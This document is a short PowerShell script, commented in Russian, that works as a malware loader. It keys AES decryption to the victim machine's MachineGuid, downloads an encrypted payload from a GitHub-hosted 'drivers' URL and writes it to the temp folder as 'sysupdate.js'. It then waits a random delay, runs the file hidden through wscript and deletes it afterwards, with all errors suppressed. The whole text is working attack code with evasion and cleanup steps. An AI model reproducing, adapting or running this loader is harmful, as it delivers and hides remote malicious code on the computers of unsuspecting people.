try {
    $ErrorActionPreference = 'SilentlyContinue'
    
    # MachineGUID
    $guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -EA 0).MachineGuid
    if (-not $guid) { exit }
    
    # AES ключ
    $key = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($guid))
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = [byte[]]@(0)*16

    # Скачивание
    $url = "https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/encrypted.b64"
    $b64 = (New-Object Net.WebClient).DownloadString($url)
    $enc = [Convert]::FromBase64String($b64)

    # Расшифровка
    $dec = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)

    # Сохранение
    $jsPath = "$env:TEMP\sysupdate.js"
    [IO.File]::WriteAllBytes($jsPath, $dec)

    # Задержка 2-3 минуты
    Start-Sleep -Seconds (120 + (Get-Random -Minimum 0 -Maximum 60))

    # Запуск
    Start-Process wscript.exe -ArgumentList "//B `"$jsPath`"" -WindowStyle Hidden

    # Очистка через 10 минут
    Start-Job {
        Start-Sleep -Seconds 600
        Remove-Item "$using:jsPath" -Force -EA SilentlyContinue
    } | Out-Null

} catch { }